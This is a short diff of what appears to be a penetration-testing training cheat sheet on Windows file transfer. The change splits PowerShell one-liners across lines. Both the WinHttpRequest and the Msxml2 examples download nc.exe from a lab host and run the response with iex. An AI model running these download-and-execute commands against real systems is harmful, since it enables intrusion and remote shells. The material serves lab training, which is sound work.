@@ -38,7 +38,9 @@ User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5
 ### **WinHttpRequest - Client**
 
 ```powershell
-PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.ResponseText
+PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();PS C:\htb> iex $h.ResponseText
 ```
 
 ### **WinHttpRequest - Server**
@@ -53,7 +55,9 @@ User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
 ### **Msxml2 - Client**
 
 ```powershell
-PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.responseText
+PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();PS C:\htb> iex $h.responseText
 ```
 
 ### **Msxml2 - Server**
